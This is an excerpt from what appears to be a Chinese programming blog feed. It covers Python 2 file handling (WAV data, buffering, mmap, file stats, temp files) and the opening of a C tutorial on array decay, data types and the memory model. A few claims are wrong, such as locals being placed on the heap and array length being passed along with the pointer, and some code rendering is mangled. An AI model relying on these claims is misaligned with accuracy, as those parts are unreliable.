struct.unpack(&#39;i&#39;,info[24:28])//因为这里是4个字节所以我们就是用的i </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">(11025,)</code></pre><p><strong>综合实验：</strong></p><p>我们现在想读入音频文件的数据部分，并且不能以字符串的形式，因为字符串的形式没法进行输入操作，我们可以将其以每两个字节为一组读入一个buf </p><p>我们首先看一下我们的音频的数据有多大：</p><pre><code class="hljs">import arrayf = open(&#39;test.wav&#39;, &#39;rb&#39;)f.seek(0, 2)  # 移动指针的位置t = f.tell()  # 返回指针的位a = (t-44)/2  # 每两个一组进行分组print a</code></pre><p>a  就是最终的组数</p><p>然后我们就创建指定类型大小的Buf，我们把buf初始化，并将44字节以后的输入写入buf</p><pre><code class="hljs">buf = array.array(&#39;h&#39;,(0 for _ in xrange(a)))f.seek(44)f.readinto(buf)</code></pre><p>接下来我们对 buf 进行操作，将操作完的结果重新写成另一个文件<br>    info &#x3D; f.read(44)<br>    for i in xrange(a):<br>        buf[i]&#x2F;&#x3D;8</p><pre><code class="hljs">f2 = open(&#39;demo.wav&#39;,&#39;wb&#39;)f2.write(info)buf.tofile(f2)f2.close()</code></pre><p> 以上步骤，我们其实已经将我们的音频声音变成了原来的1&#x2F;8</p><p> <strong>代码示例：</strong></p><pre><code class="hljs"># coding=utf-8import structimport arrayf = open(&#39;test.wav&#39;, &#39;rb&#39;)info = f.read(44)f.seek(0, 2)  # 移动指针的位置t = f.tell()  # 返回指针的位置a = (t-44)/2buf = array.array(&#39;h&#39;,(0 for _ in xrange(a)))f.seek(44)f.readinto(buf)for i in xrange(a):    buf[i]/=8f2 = open(&#39;demo.wav&#39;,&#39;wb&#39;)f2.write(info)buf.tofile(f2)f2.close()</code></pre><h2 id="三、如何设置文件的缓冲"><a href="#三、如何设置文件的缓冲" class="headerlink" title="三、如何设置文件的缓冲"></a><strong>三、如何设置文件的缓冲</strong></h2><p>将文件写入硬件设备的时候是按照块进行写入的，每个块有固定的大小，也就是说，进行一次写入操作的时间是固定的，不管你有没有把块填满，因此如果没有缓冲，就会在块不满的情况下进行写入，导致次数过多时间过长，于是我们需要设置文件缓冲。</p><p>缓冲又分为全缓冲和行缓冲，一般文件的缓冲就是全缓冲，意思就是填满一个就释放一个，而行缓冲就是遇到换行符就释放。</p><p>当然并不是所有的设备都需要缓冲的，串口设备我们就希望能即时发送，于是我们不设置缓冲区</p><h3 id="1-检验缓冲区大小实验："><a href="#1-检验缓冲区大小实验：" class="headerlink" title="1.检验缓冲区大小实验："></a><strong>1.检验缓冲区大小实验：</strong></h3><p><strong>ipython ：</strong></p><p>In [13]: f &#x3D; open(‘demo.txt’,’w’)</p><p>In [14]: f.write(‘abc’)</p><p>In [15]: f.write(‘+’*4093)</p><p>In [16]: f.write(‘-‘)</p><p><strong>另一个终端：</strong></p><pre><code class="hljs">$ tail -f demo.txt</code></pre><p>14、15 命令执行以后 tail 都没反应，直到16命令执行，在tail 后面输出了 abc和 4093个*，可见缓冲区的大小是4096字节</p><h3 id="2-修改默认缓冲区的大小"><a href="#2-修改默认缓冲区的大小" class="headerlink" title="2.修改默认缓冲区的大小"></a><strong>2.修改默认缓冲区的大小</strong></h3><h4 id="1-全缓冲："><a href="#1-全缓冲：" class="headerlink" title="(1)全缓冲："></a><strong>(1)全缓冲：</strong></h4><p>open 函数 有一个 buffering 的选项可以设置缓冲区大小，我们设置为大于一的整数</p><pre><code class="hljs">f = open(&#39;demo.txt&#39;,&#39;w&#39;,buffering = 2048)</code></pre><h4 id="2-行缓冲："><a href="#2-行缓冲：" class="headerlink" title="(2)行缓冲："></a><strong>(2)行缓冲：</strong></h4><p>将 buffering 设置为1 </p><pre><code class="hljs">f = open(&#39;demo.txt&#39;,&#39;w&#39;,buffering = 1)</code></pre><h4 id="3-无缓冲："><a href="#3-无缓冲：" class="headerlink" title="(3)无缓冲："></a><strong>(3)无缓冲：</strong></h4><p>将 buffering 设置为0</p><pre><code class="hljs">f = open(&#39;demo.txt&#39;,&#39;w&#39;,buffering = 0)</code></pre><h2 id="四、如何将文件映射到内存"><a href="#四、如何将文件映射到内存" class="headerlink" title="四、如何将文件映射到内存"></a><strong>四、如何将文件映射到内存</strong></h2><p><strong>需求：</strong></p><p>1.在访问二进制文件的时候，希望把文件映射到内存空间，实现随机访问<br>2.嵌入式设备中，寄存器被编址到内存地址空间，我们可以映射 &#x2F;dev&#x2F;mem 的某些范围，来操纵这些寄存器<br>3.如果多个进程映射同一个文件，还能实现进程通信</p><p>使用 mmap.mmap() </p><p>通过下面这条命令创建一个1M的全0文件：</p><pre><code class="hljs">dd if=/dev/zero of=demo.bin bs=1024 count=1024</code></pre><p>使用 od -x 查看，发现的确是全0</p><pre><code class="hljs"> od -x demo.bin </code></pre><p>0000000 0000 0000 0000 0000 0000 0000 0000 0000<br>*<br>4000000</p><p>我们获取文件描述符</p><p><strong>示例代码：</strong></p><pre><code class="hljs">f = open(&#39;demo.bin&#39;,&#39;r+b&#39;)print f.fileno()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">3</code></pre><p>我们将整个文件映射到变量m </p><pre><code class="hljs">m = mmap.mmap(num,0,mmap.ACCESS_WRITE) # 这里的0表示的是全部文件</code></pre><p>我们看一下内容：</p><pre><code class="hljs">In [10]: m[100]Out[10]: &#39;\x00&#39;</code></pre><p>修改：</p><pre><code class="hljs">In [11]: m[100] = &#39;\x08&#39;</code></pre><p>查看修改后的内容</p><pre><code class="hljs">In [12]: m[99:120]Out[12]: &#39;\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;</code></pre><p>实际上在这种情况下文件已经被修改。</p><p>我们还可以跳过整数倍的页的大小对文件进行修改（页的概念来源于操作系统，如果不了解可以去查一下）</p><pre><code class="hljs"> m = mmap.mmap(num,mmap.PAGESIZE*8,mmap.ACCESS_WRITE,offset = mmap.PAGESIZE*4)</code></pre><h2 id="五、如何访问文件的状态"><a href="#五、如何访问文件的状态" class="headerlink" title="五、如何访问文件的状态"></a><strong>五、如何访问文件的状态</strong></h2><p>在某些项目中我们需要获取文件的状态，<br>比如：<br>(1)文件类型<br>(2)文件权限<br>(3)文件最后修改时间<br>(4)文件的大小</p><h3 id="方法一：系统调用"><a href="#方法一：系统调用" class="headerlink" title="方法一：系统调用"></a><strong>方法一：系统调用</strong></h3><p><strong>1.os.stat()</strong></p><p><strong>2.os.lstat()</strong></p><p>它与os.stat 的区别在于它不跟随符号链接文件，意思就是lstat 拿到的是快捷方式的属性，而stat 拿到的是原始文件的属性</p><p><strong>3.os.fstat()</strong></p><p>这个函数和上面两个函数的区别是这个函数传入的参数是文件描述符，而不是上面两个参数传入的路径。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">In [3]: import osIn [4]: os.stat(&#39;demo.bin&#39;)Out[4]: posix.stat_result(st_mode=33188, st_ino=264254, st_dev=2049, st_nlink=1, st_uid=0, st_gid=0, st_size=1048576, st_atime=1538365252, st_mtime=1538364797, st_ctime=1538364797)</code></pre><p><strong>查看文件的类型：</strong></p><p>文件的类型就存储在 st_mode  里面，我们需要将其解析</p><pre><code class="hljs">In [15]: import osIn [16]: s = os.stat(&#39;demo.bin&#39;)In [17]: import statIn [18]: stat.S_ISDIR(s.st_mode)Out[18]: False</code></pre><p><strong>查看文件的权限</strong></p><pre><code class="hljs">In [19]: s.st_mode &amp; stat.S_IRUSROut[19]: 256</code></pre><p>只要这个返回值大于0就说明有用户读的权限</p><pre><code class="hljs">In [20]: s.st_mode &amp; stat.S_IXUSROut[20]: 0</code></pre><p>可见用户的执行权限是0</p><p><strong>查看文件的最后访问时间：</strong></p><pre><code class="hljs">In [25]: import timeIn [26]: time.localtime(s.st_atime)Out[26]: time.struct_time(tm_year=2018, tm_mon=10, tm_mday=1, tm_hour=11, tm_min=40, tm_sec=52, tm_wday=0, tm_yday=274, tm_isdst=0)</code></pre><h3 id="方法二：快捷函数"><a href="#方法二：快捷函数" class="headerlink" title="方法二：快捷函数"></a><strong>方法二：快捷函数</strong></h3><p>快捷函数在底层实现上是利用的是系统函数，但是会让你操作起来更加方便</p><p><strong>判断文件类型：</strong></p><pre><code class="hljs">In [27]: os.path.isdir(&#39;demo.bin&#39;)Out[27]: FalseIn [28]: os.path.isfile(&#39;demo.bin&#39;)Out[28]: True</code></pre><p><strong>判断文件最后访问时间：</strong></p><pre><code class="hljs">In [32]: time.localtime(os.path.getatime(&#39;demo.bin&#39;))Out[32]: time.struct_time(tm_year=2018, tm_mon=10, tm_mday=1, tm_hour=11, tm_min=40, tm_sec=52, tm_wday=0, tm_yday=274, tm_isdst=0)</code></pre><h2 id="六、如何使用临时文件："><a href="#六、如何使用临时文件：" class="headerlink" title="六、如何使用临时文件："></a><strong>六、如何使用临时文件：</strong></h2><p>比如我们采集数据进行分析，但是我们只需要保存结果，我们采集的数据如果常驻内存就会让电脑崩溃，于是我们将这个数据放在临时文件中（外部存储），在文件关闭后将被删除</p><p><strong>示例代码：</strong></p><pre><code class="hljs">In [15]: from tempfile import TemporaryFile,NamedTemporaryFileIn [16]: f = TemporaryFile()In [17]: f.write(&#39;abc&#39;*10000)In [18]: f.seek(0)In [19]: f.read(100)Out[19]: &#39;abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabca&#39;</code></pre><p>这个临时文件在系统中是找不到的，如果我们想创建一个能在文件系统中看到的临时文件，我们就用NamedTemporaryFile</p><p><strong>示例代码：</strong></p><p>我们能看到文件路径</p><pre><code class="hljs">In [20]: nte = NamedTemporaryFile()In [21]: nte.nameOut[21]: &#39;c:\\users\\k0rz3n\\appdata\\local\\temp\\tmpob51yb&#39;</code></pre><p>如果我们重新创建一个文件的话，原来的文件就会被关闭，关闭以后临时文件就会被自动删除，如果我们不想让他删除，我们在创建的时候就要设置一个参数</p><pre><code class="hljs">nte = NamedTemporaryFile(delete = False)</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言编程进阶教程（详细）</title>
    <link href="/2018/09/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B%EF%BC%88%E8%AF%A6%E7%BB%86%EF%BC%89/"/>
    <url>/2018/09/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%E6%95%99%E7%A8%8B%EF%BC%88%E8%AF%A6%E7%BB%86%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>全文已经备份在我的github上，地址：<a href="https://github.com/K0rz3n/C-Advanced-programming/blob/master/C-Advanced.md">https://github.com/K0rz3n/C-Advanced-programming/blob/master/C-Advanced.md</a></p><p>C 语言作为所有语言的基础地位是可想而知的，但是可能对于我 平时写的比较少，当初学的也不是很深入，但是很多看似平常的编程中其实涉及到很多理论性的东西，需要我们站在编译器的角度看问题，我越到后面发现这一块知识的空缺的危害，于是趁着还有时间，赶紧回炉重造一下，简单的记录一下，作为备忘。</p><h2 id="0X01-数组做函数参数的退化问题"><a href="#0X01-数组做函数参数的退化问题" class="headerlink" title="0X01 数组做函数参数的退化问题"></a><strong>0X01 数组做函数参数的退化问题</strong></h2><span id="more"></span><h3 id="初始程序：简单的排序"><a href="#初始程序：简单的排序" class="headerlink" title="初始程序：简单的排序"></a><strong>初始程序：简单的排序</strong></h3><pre><code class="hljs">#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;#include &quot;string.h&quot;void printArray(int a[8])&#123;    int i =0;    for (i = 0; i &lt; 8; i++) &#123;        printf(&quot;%d &quot;,a[i]);    &#125;&#125;void sortArray(int a[8])&#123;    int i,j,tmp;    for(i=0;i&lt;8;i++)&#123;        for(j=i+1;j&lt;8;j++)&#123;            if(a[i]&gt;a[j])&#123;                tmp = a[i];                a[i] = a[j];                a[j] = tmp;            &#125;        &#125;    &#125;&#125;//排序void main() &#123;    int i,j,tmp;    int a[] = &#123;11, 2, 3, 4, 5, 6, 67, 788&#125;;    //排序前    printf(&quot;排序前:&quot;);    printArray(a);    //选择法进行排序    //按住一个变量不变让另一个变量进行变化    sortArray(a);    //排序后    printf(&quot;排序后:&quot;);    printArray(a);&#125;</code></pre><h3 id="抛出问题："><a href="#抛出问题：" class="headerlink" title="抛出问题："></a><strong>抛出问题：</strong></h3><p>但是这个程序实际上是不完美的，因为我们在程序中已经将数组的大小固定死了，实际上我们应该做的是传参数中的时候将数组的指针和数组的长度都传给对应的函数（<strong>这就是我们下面要说的数组做函数参数的退化问题</strong>）。</p><h3 id="数组做函数参数的退化问题"><a href="#数组做函数参数的退化问题" class="headerlink" title="数组做函数参数的退化问题"></a><strong>数组做函数参数的退化问题</strong></h3><p>我们传递数组的时候传递的实际上是一个指向数组首地址的指针以及数组的长度，因此在这个程序中我们还需要设置一个数组长度的参数</p><p>于是乎，代码变成了下面这个样子：</p><pre><code class="hljs">#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;#include &quot;string.h&quot;void printArray(int a[8],int num)&#123;    int i =0;    for (i = 0; i &lt; num; i++) &#123;        printf(&quot;%d &quot;,a[i]);    &#125;&#125;void sortArray(int a[8],int num)&#123;    int i,j,tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(a[i]&gt;a[j])&#123;                tmp = a[i];                a[i] = a[j];                a[j] = tmp;            &#125;        &#125;    &#125;&#125;//排序void main() &#123;    int i,j,tmp,num;    int a[] = &#123;11, 2, 3, 4, 5, 6, 67, 788&#125;;    num = sizeof(a)/sizeof(a[0]);    //排序前    printf(&quot;排序前:&quot;);    printArray(a,num);    //选择法进行排序    //按住一个变量不变让另一个变量进行变化    sortArray(a,num);    //排序后    printf(&quot;排序后:&quot;);    printArray(a,num);&#125;</code></pre><h3 id="进一步发问"><a href="#进一步发问" class="headerlink" title="进一步发问"></a><strong>进一步发问</strong></h3><p><strong>我们形参中的 a<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B6.png">8</a> 中的“8” 真的有意义吗？</strong><br>不如我们把它去掉</p><pre><code class="hljs">#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;#include &quot;string.h&quot;void printArray(int a[],int num)&#123;    int i =0;    for (i = 0; i &lt; num; i++) &#123;        printf(&quot;%d &quot;,a[i]);    &#125;&#125;void sortArray(int a[],int num)&#123;    int i,j,tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(a[i]&gt;a[j])&#123;                tmp = a[i];                a[i] = a[j];                a[j] = tmp;            &#125;        &#125;    &#125;&#125;//排序void main() &#123;    int i,j,tmp,num;    int a[] = &#123;11, 2, 3, 4, 5, 6, 67, 788&#125;;    num = sizeof(a)/sizeof(a[0]);    //排序前    printf(&quot;排序前:&quot;);    printArray(a,num);    //选择法进行排序    //按住一个变量不变让另一个变量进行变化    sortArray(a,num);    //排序后    printf(&quot;排序后:&quot;);    printArray(a,num);&#125;</code></pre><h3 id="进一步印证："><a href="#进一步印证：" class="headerlink" title="进一步印证："></a><strong>进一步印证：</strong></h3><p><strong>我们直接将其换成指针</strong></p><pre><code class="hljs">#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;#include &quot;string.h&quot;void printArray(int *a,int num)&#123;    int i =0;    int num2 = 0;    num2 = sizeof(a)/sizeof(a[0]);    printf(&quot;传进来的参数的长度为：%d \n&quot;,num2);    for (i = 0; i &lt; num; i++) &#123;        printf(&quot;%d &quot;,a[i]);    &#125;    printf(&quot;\n&quot;);&#125;void sortArray(int *a,int num)&#123;    int i,j,tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(a[i]&gt;a[j])&#123;                tmp = a[i];                a[i] = a[j];                a[j] = tmp;            &#125;        &#125;    &#125;&#125;//排序void main() &#123;    int i,j,tmp,num;    int a[] = &#123;11, 2, 3, 4, 5, 6, 67, 788&#125;;    num = sizeof(a)/sizeof(a[0]);    printf(&quot;实际的数组的长度为：%d\n&quot;,num);    //排序前    printf(&quot;排序前:&quot;);    printArray(a,num);    //选择法进行排序    //按住一个变量不变让另一个变量进行变化    sortArray(a,num);    //排序后    printf(&quot;排序后&quot;);    printArray(a,num);&#125;</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">实际的数组的长度为：8排序前:传进来的参数的长度为：111 2 3 4 5 6 67 788排序后:传进来的参数的长度为：12 3 4 5 6 11 67 788</code></pre><h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a><strong>结论：</strong></h3><p>以上的例子充分说明了，形参和实参并不是同一个类型，实参是一个数组，而形参是一个指针（两个a 的 数据类型不同），可以这样说，就算是你把形参中的<em>a 换成了a<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B6.png">8</a>，你在检查他的长度的时候他也依然是长度为1（也就是说，他长度为1并不是因为我把a<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B6.png">8</a>写成了</em>a 的缘故）</p><p>这实际上是C编译器帮我们优化的，因为如果形参也是一个数组，那么就意味着要将实参中的数组原封不动的拷贝到形参中，这无形中降低了C语言运行的效率（我们知道C语言就是以效率高著称），而直接在主调用函数和被调用函数中间通过指针去操纵内存效率时非常高的</p><p><strong>卖个关子：</strong></p><p>形参写在函数上和写在函数内是一样的，只不过写在函数上有着对外的属性而已。</p><blockquote><p><strong>对外的属性什么意思？</strong></p><p>对外的属性就是指可以通过实参传递给形参的方式来初始化这个参数。</p></blockquote><h2 id="0X02-数据类型的本质的剖析"><a href="#0X02-数据类型的本质的剖析" class="headerlink" title="0X02 数据类型的本质的剖析"></a><strong>0X02 数据类型的本质的剖析</strong></h2><h3 id="1-为什么要引入数据类型的概念"><a href="#1-为什么要引入数据类型的概念" class="headerlink" title="1.为什么要引入数据类型的概念?"></a><strong>1.为什么要引入数据类型的概念?</strong></h3><p>为了方便的表示显示生活中的人事物</p><h3 id="2-数据类型的本质"><a href="#2-数据类型的本质" class="headerlink" title="2.数据类型的本质"></a><strong>2.数据类型的本质</strong></h3><p>（1）是固定大小内存的别名（告诉C编译器需要让他分配几个字节的空间）</p><h3 id="3-一些数据类型的小问题"><a href="#3-一些数据类型的小问题" class="headerlink" title="3.一些数据类型的小问题"></a><strong>3.一些数据类型的小问题</strong></h3><p><strong>(1)如何计算数据类型的大小</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int a;    int b[10];    printf(&quot;sizeof(a):%d,sizeof(b):%d&quot;,sizeof(a),sizeof(b));&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">sizeof(a):4,sizeof(b):40</code></pre><p><strong>（2）如何给数据类型取别名</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    char name[64];    int age;&#125;Teachers;void main()&#123;    Teachers xiaoming;    xiaoming.age = 16;    printf(&quot;%d&quot;,xiaoming.age);&#125;</code></pre><p><strong>（3）如何理解 void 类型以及 void指针</strong>  </p><p>推荐一篇文章给大家，我认为讲的比较透彻</p><p>链接：<a href="https://pan.baidu.com/s/1JpekOYDeFyvcCKFmVYS9hw">https://pan.baidu.com/s/1JpekOYDeFyvcCKFmVYS9hw</a> 密码：v11x</p><h3 id="4-数组数据类型"><a href="#4-数组数据类型" class="headerlink" title="4. 数组数据类型"></a><strong>4. 数组数据类型</strong></h3><h3 id="举一个例子"><a href="#举一个例子" class="headerlink" title="举一个例子"></a><strong>举一个例子</strong></h3><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int a;    int b[10];    printf(&quot;b:%d,b+1:%d,&amp;b:%d,&amp;b+1:%d&quot;,b,b+1,&amp;b,&amp;b+1);&#125;</code></pre><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a><strong>结果：</strong></h3><pre><code class="hljs">b:6422280,b+1:6422284,&amp;b:6422280,&amp;b+1:6422320</code></pre><h3 id="抛出问题：-1"><a href="#抛出问题：-1" class="headerlink" title="抛出问题："></a><strong>抛出问题：</strong></h3><p>我们可以看到 b 和 &amp;b 的结果是一样的，但是为什么 b+1 和 &amp;b+1 的结果却不一样呢（b+1 加了4 但是 &amp;b+1 加了 40）？</p><p>这说明 b 和 &amp;b 所代表的数据类型不一样，<strong>b 代表的是数组首元素的地址，而 &amp;b 代表的是整个数组的地址</strong></p><h3 id="数组数据类型"><a href="#数组数据类型" class="headerlink" title="数组数据类型"></a><strong>数组数据类型</strong></h3><p>这里涉及到三个知识点</p><p><strong>（1）数组类型<br>（2）数组指针<br>（2）数组类型和数组指针类型的关系</strong></p><p>在0X07节数组类型和多维数组的本质中我们会详细的剖析</p><h3 id="5-函数数据类型"><a href="#5-函数数据类型" class="headerlink" title="5.函数数据类型"></a><strong>5.函数数据类型</strong></h3><p>在 0X13 节 函数指针中我会有比较详细的分析</p><h2 id="0X03-变量本质的分析"><a href="#0X03-变量本质的分析" class="headerlink" title="0X03 变量本质的分析"></a><strong>0X03 变量本质的分析</strong></h2><h3 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h3><p>既能读又能写的内存对象，如果是一旦声明就不能改了那就是常量</p><h3 id="2-本质："><a href="#2-本质：" class="headerlink" title="2.本质："></a><strong>2.本质：</strong></h3><p><strong>（1）变量是（一段连续）内存空间（地址）的别名</strong></p><p>我们可以将其理解为一个门牌号，比如一个人的住址是： 芯芯小区从东门进去的第3栋楼的25层左边的那个门，人们每次这么传递信息觉得非常的麻烦，于是给每栋楼每个门都编了号，后来我们就说住址是：芯芯小区3栋2501 （那么计算机中的物理地址就对应着这里的**“芯芯小区从东门进去的第3栋楼的25层左边的那个门”<strong>，而变量对应的就是</strong>“芯芯小区3栋2501”**）</p><p><strong>（2）那么变量的类型代表着什么？</strong></p><p>变量的类型决定着编译器将预留多大的内存空间，<strong>变量一定要有类型</strong>，没有类型编译器就会报错，认为这是无法操控的（具体可见上面我网盘链接分享的那篇文章）</p><p><strong>（3）简单解释一下&amp; 和<code>*</code></strong></p><p>有了上面两段的基础，我就来简单的解释一下&amp;和*符号的含义：</p><p>①&amp;符号作用是通过门牌号（变量名）得到原始的家庭住址（变量指向内存的地址）<br>②*符号作用是通过原始的家庭住址（变量指向内存的地址）得到家里面有什么人（变量的值）</p><p><strong>注意：</strong></p><p><strong>我们是通过变量往内存读写数据，而不是向变量读写数据</strong></p><h3 id="3-通过变量修改内存有几种方法？"><a href="#3-通过变量修改内存有几种方法？" class="headerlink" title="3.通过变量修改内存有几种方法？"></a><strong>3.通过变量修改内存有几种方法？</strong></h3><p><strong>（1）直接</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void man(void) &#123;    int a;    a =10;    printf(&quot;%d&quot;,&amp;a);&#125;i</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">6422316</code></pre><p><strong>（2）间接</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void main(void) &#123;    int a;    a =10;    *((int*)6422316) = 200;    printf(&quot;%d&quot;,a);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">200</code></pre><h3 id="4-变量的生命周期"><a href="#4-变量的生命周期" class="headerlink" title="4.变量的生命周期"></a><strong>4.变量的生命周期</strong></h3><p>这一部分我们会在下面的内存四区模型的讲解中给读者讲述。</p><h3 id="5-C编译器是如何管理两个函数变量之间的关系的"><a href="#5-C编译器是如何管理两个函数变量之间的关系的" class="headerlink" title="5.C编译器是如何管理两个函数变量之间的关系的"></a><strong>5.C编译器是如何管理两个函数变量之间的关系的</strong></h3><p>这一部分我们会在下面的内存四区模型以及函数指针的讲解中给读者讲述。</p><h2 id="0X04-程序的内存四区模型"><a href="#0X04-程序的内存四区模型" class="headerlink" title="0X04 程序的内存四区模型"></a><strong>0X04 程序的内存四区模型</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%85%E5%AD%98%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="图一"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9B%9B%E5%8C%BA%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.png" alt="图二"></p><h3 id="1-静态区模型"><a href="#1-静态区模型" class="headerlink" title="1.静态区模型"></a><strong>1.静态区模型</strong></h3><p><strong>实例：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;char * getString1()&#123;    char *p1 = &quot;abcdefgh1&quot;;    return p1;&#125;char * getString2()&#123;    char * p2 = &quot;abcdefgh2&quot;;    return p2;&#125;void main(void) &#123;  char * p1 = NULL;  char * p2 = NULL;  p1 = getString1();  p2 = getString2();    //打印 p1 p2 地址的字符串    printf(&quot;p1:%s\np2:%s\n&quot;,p1,p2);    //打印p1 p2 的地址    printf(&quot;p1:%d\nP2:%d\n&quot;,p1,p2);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">p1:abcdefgh1p2:abcdefgh2p1:4214884P2:4214894</code></pre><p>我们稍微改动一下，将第一个字符串也替换成和第二个字符串一样，那么，结果中后两个p1 、p2 的值会发生变化吗？（代码就不贴了，读者自己修改一下实验）</p><p><strong>结果：</strong></p><pre><code class="hljs">p1:abcdefgh2p2:abcdefgh2p1:4214884P2:4214884</code></pre><p>我们惊奇的发现下面两个p1、p2 居然地址变成了一个地址，下面我们来自己画一下这个程序的内存四区图来分析这个问题，在画图之前我么首先要记住下面几句无比经典的话：</p><blockquote><p><strong>1. 指针指向谁就将谁的地址赋值给指针</strong><br><strong>2. 指针变量和其所指向的内存空间变量是两个不同的概念</strong><br><strong>3. 理解指针的关键在于理解内存，没有内存哪来的指针</strong></p></blockquote><p>首先是main 在栈区存放局部变量p1 p2，然后进入子函数，在静态区存储了字符串常量abcdefgh2，接着就是在堆区存放了一个局部变量p1,并将p1指向了该字符串的地址。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B1.png" alt="此处输入图片的描述"></p><p>然后回到主函数,子函数中的p1 将这个地址给了主函数中的 p1，于是主函数中的p1 指向了该字符串的地址</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B2.png" alt="此处输入图片的描述"></p><p>然后子函数中的 p1 被自动的析构，现在就只有主函数中的p1指向了该字符串的地址了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B3.png" alt="此处输入图片的描述"></p><p>当进入了第二个子函数以后，关键的点来了，编译器发现这次的字符串和上次的字符串是一样的，于是自动进行了优化，并没有再开辟一块空间存储相同的数据。（后面的步骤和前面的就一样了不再赘述）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B4.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B5.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B6.png" alt="此处输入图片的描述"></p><h3 id="2-堆区和栈区的理解"><a href="#2-堆区和栈区的理解" class="headerlink" title="2.堆区和栈区的理解"></a><strong>2.堆区和栈区的理解</strong></h3><p><strong>1.堆区示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;char * getMem(int num)&#123;    char * p1 = NULL;    p1 = (char*)malloc(sizeof(char)*num);    if(p1 == NULL)&#123;        return NULL;    &#125;    return p1;&#125;int main() &#123;    char * tmp;    tmp = getMem(10);    if(tmp == NULL)&#123;        return NULL;    &#125;    strcpy(tmp,&quot;111222&quot;);    printf(&quot;%s&quot;,tmp);&#125;</code></pre><p><strong>下面的图解释了内存分配的过程</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A31.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png" alt="此处输入图片的描述"></p><p><img 